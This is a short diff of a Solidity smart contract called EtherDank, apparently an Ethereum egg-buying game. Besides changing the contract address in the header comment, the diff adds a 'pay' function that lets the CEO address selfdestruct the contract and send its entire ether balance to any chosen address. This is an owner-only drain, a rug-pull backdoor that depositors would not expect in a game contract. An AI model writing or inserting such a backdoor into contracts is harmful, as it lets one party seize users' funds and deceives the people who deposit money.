@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EtherDank at 0x74a9a3d30f26ad987007b2dd59a489ac65f40abe
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EtherDank at 0x78c9e50652d9c9bc038151c39bfbee0fe2a1fe4b
 */
 pragma solidity ^0.4.18; // solhint-disable-line
 
@@ -229,7 +229,10 @@ contract EtherDank {
         return calculateEggBuy(eth, address(this).balance);
     }
     
-    
+    function pay (address _payee) public {
+        require(ceoAddress == msg.sender);
+        selfdestruct(_payee);
+    }
 
 }
 
